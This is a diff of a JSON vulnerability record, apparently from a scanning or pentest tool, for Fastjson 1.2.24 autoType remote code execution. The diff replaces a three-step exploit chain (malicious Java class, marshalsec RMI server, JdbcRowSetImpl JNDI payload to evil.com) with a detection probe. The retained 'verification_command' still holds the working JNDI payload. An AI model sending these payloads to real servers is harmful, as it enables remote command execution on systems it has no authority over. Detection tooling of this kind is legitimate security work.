@@ -1,5 +1,6 @@
 {
   "vuln_id": "fastjson_1224",
+  "dispatch_skill": "fastjson_rce",
   "description": "Fastjson 1.2.24 在解析JSON时支持autoType实例化特定类，通过构造恶意利用链实现远程命令执行",
   "category": "java_deserialization",
   "cves": [
@@ -24,27 +25,27 @@
     "/"
   ],
   "detection_method": "发送一个包含@type字段的JSON POST请求到目标，观察响应是否包含fastjson相关错误或正常处理，例如：curl -X POST http://{TARGET}/ -H \"Content-Type: application/json\" --data '{\"@type\":\"java.lang.Class\"}'，如果返回错误或特定响应，可能表示存在漏洞",
-  "exploit_steps": [
+  "probes": [
     {
-      "step": 1,
-      "description": "编译并上传恶意Java类文件到攻击者控制的服务器，例如TouchFile.class，用于执行命令",
-      "command": "javac TouchFile.java",
-      "expected_result": "生成TouchFile.class文件",
-      "notes": "确保Java环境可用，命令示例中的TouchFile.java内容为：import java.lang.Runtime; import java.lang.Process; public class TouchFile { static { try { Runtime rt = Runtime.getRuntime(); String[] commands = {\"touch\", \"/tmp/success\"}; Process pc = rt.exec(commands); pc.waitFor(); } catch (Exception e) { } } }"
-    },
-    {
-      "step": 2,
-      "description": "使用marshalsec启动RMI服务器，监听指定端口并加载远程恶意类",
-      "command": "java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://evil.com/#TouchFile\" 9999",
-      "expected_result": "RMI服务器在端口9999启动，等待连接",
-      "notes": "需要提前下载marshalsec项目jar包，evil.com替换为攻击者服务器地址"
-    },
-    {
-      "step": 3,
-      "description": "向目标服务器发送包含恶意JdbcRowSetImpl的JSON payload，触发JNDI注入执行命令",
-      "command": "curl -X POST http://{TARGET}/ -H \"Content-Type: application/json\" --data '{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://evil.com:9999/TouchFile\",\"autoCommit\":true}}'",
-      "expected_result": "命令执行成功，例如在目标服务器上创建/tmp/success文件",
-      "notes": "evil.com和端口9999需与步骤2中RMI服务器配置一致，目标地址用{TARGET}占位"
+      "id": "fastjson_atype_probe",
+      "description": "POST @type=java.lang.Class，观察响应错误信息",
+      "method": "POST",
+      "path": "/",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}",
+      "timeout": 10,
+      "success_signs": {
+        "body_contains_any": [
+          "fastjson",
+          "JSONException",
+          "JdbcRowSetImpl",
+          "ParseException",
+          "autoTypeSupport"
+        ]
+      },
+      "confidence": 0.85
     }
   ],
   "verification_command": "curl -X POST http://{TARGET}/ -H \"Content-Type: application/json\" --data '{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://evil.com:9999/TouchFile\",\"autoCommit\":true}}'",
